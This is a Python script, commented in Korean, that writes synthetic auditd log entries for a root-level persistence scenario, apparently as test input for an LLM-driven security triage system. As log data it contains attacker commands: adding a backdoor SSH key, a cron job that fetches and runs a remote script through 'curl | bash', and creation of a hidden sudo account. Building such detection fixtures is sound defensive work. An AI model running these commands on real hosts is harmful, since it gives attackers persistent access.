"""지속성 확보(Persistence) 시나리오 - authorized_keys 추가 + crontab 백도어 등록.

핵심 판단 포인트: 이 시나리오는 의도적으로 auth/network 계층에 아무 증거도
남기지 않는다 (공격자가 이미 침해에 성공해 root 권한을 가진 상태에서 재접속
경로를 몰래 심는 행위이므로, 로그인 이벤트 자체가 없는 게 오히려 현실적이다).
오직 audit 계층 하나에만 증거가 있는 극단적 케이스를 통해, "서로 다른 도구
2종류 이상 사용" 게이트가 정말 최소 요구사항으로 타당한지, 아니면 이런 케이스를
못 다루게 막는 과도한 제약인지 확인한다.
"""

import os
from datetime import datetime, timezone

LOG_DIR = "sample_logs"
HOST = "web-01"

EVENT_TIME = datetime(2026, 9, 14, 22, 30, 0, tzinfo=timezone.utc)
EPOCH_BASE = int(EVENT_TIME.timestamp())

GS = "\x1d"
SERIAL_BASE = 9900

audit_lines = []


def make_execve_pair(serial, offset_sec, ppid, pid, comm, exe, argv):
    epoch = EPOCH_BASE + offset_sec
    syscall_line = (
        f"type=SYSCALL msg=audit({epoch}.001:{serial}): arch=c000003e syscall=59 "
        f"success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=2 ppid={ppid} pid={pid} "
        f"auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 "
        f"tty=(none) ses=4294967295 comm=\"{comm}\" exe=\"{exe}\" subj=unconfined key=\"exec\""
        f"{GS}ARCH=x86_64 SYSCALL=execve AUID=\"unset\" UID=\"root\" GID=\"root\" "
        f"EUID=\"root\" SUID=\"root\" FSUID=\"root\" EGID=\"root\" SGID=\"root\" FSGID=\"root\""
    )
    argv_fields = " ".join(f'a{i}="{arg}"' for i, arg in enumerate(argv))
    execve_line = f"type=EXECVE msg=audit({epoch}.001:{serial}): argc={len(argv)} {argv_fields}"
    return [syscall_line, execve_line]


# (1) authorized_keys에 공격자 공개키 추가 (재접속 경로 확보)
audit_lines += make_execve_pair(
    SERIAL_BASE + 1, 5, ppid=1, pid=9900,
    comm="bash", exe="/usr/bin/bash",
    argv=[
        "bash", "-c",
        "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC_backdoor_key attacker@evil "
        ">> /root/.ssh/authorized_keys",
    ],
)
# (2) crontab에 주기적 재접속(백도어) 등록
audit_lines += make_execve_pair(
    SERIAL_BASE + 2, 10, ppid=1, pid=9901,
    comm="crontab", exe="/usr/bin/crontab",
    argv=["crontab", "-l"],
)
audit_lines += make_execve_pair(
    SERIAL_BASE + 3, 12, ppid=9901, pid=9902,
    comm="bash", exe="/usr/bin/bash",
    argv=[
        "bash", "-c",
        "(crontab -l; echo '*/10 * * * * curl -s http://45.76.13.201/beacon.sh | bash') | crontab -",
    ],
)
# (3) 새 관리자 계정 생성 (또 다른 지속성 확보 수단)
audit_lines += make_execve_pair(
    SERIAL_BASE + 4, 20, ppid=1, pid=9903,
    comm="useradd", exe="/usr/sbin/useradd",
    argv=["useradd", "-m", "-G", "sudo", "-s", "/bin/bash", "sysupdate"],
)

with open(os.path.join(LOG_DIR, "sample_audit.log"), "a", encoding="utf-8") as f:
    f.write("\n" + "\n".join(audit_lines) + "\n")

print("지속성 확보 시나리오 로그 추가 완료 (audit 계층만).")
print(f"EPOCH_BASE={EPOCH_BASE} -> {datetime.fromtimestamp(EPOCH_BASE, tz=timezone.utc)}")
print()
print("test_consistency.py의 SEED (incident_id 확인! src_ip는 None):")
print(
    f"""
SEED = {{
    "incident_id": "CONSISTENCY-TEST-07",
    "detection_source": "llm_triage",
    "trigger_time": "2026-09-14T22:30:00+00:00",
    "trigger_description": "root 권한으로 SSH authorized_keys 파일 수정, crontab을 통한 주기적 외부 스크립트 실행 등록, 신규 관리자 계정(sysupdate) 생성이 연달아 발생",
    "confidence_initial": 0.65,
    "severity_hint": "CRITICAL",
    "priority": 1,
    "host": "{HOST}",
    "src_ip": None,
    "reasoning": "root 권한 세션에서 authorized_keys 수정, crontab 백도어 등록, 신규 계정 생성이 짧은 시간 내 연이어 발생해 지속적 재접속 경로 확보(persistence) 정황이 강하게 의심됩니다.",
}}
"""
)